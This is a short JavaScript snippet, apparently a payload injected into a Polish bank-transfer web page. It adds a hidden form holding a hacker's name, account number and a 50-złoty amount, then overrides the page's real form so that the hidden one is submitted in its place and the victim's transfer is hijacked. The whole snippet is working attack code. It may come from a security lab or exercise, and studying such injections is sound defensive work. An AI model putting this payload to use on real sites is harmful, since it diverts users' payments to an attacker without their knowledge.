var form = document.getElementsByTagName("form")[0];

form.insertAdjacentHTML('afterend', '<div id="hacked" style="display: none;"> '+
'<form id="hackedForm">'+
'<input type="text" name="name" value="H3cker"> '+   
'<input type="text" name="account" value="1111 1111 1111 1111"> '+   
'<input type="number" name="zl" value="50"> '+   
'<input type="number" name="gr" value="0"> '+   
'<textarea name="title" form="hackedForm" value="tytul_przelewu_h3cked"></textarea> '+   
'<input type="submit" value="Submit"></form></div>');

form.setAttribute("onsubmit", "event.preventDefault(); var secondForm = document.getElementsByTagName('form')[1]; secondForm.submit();");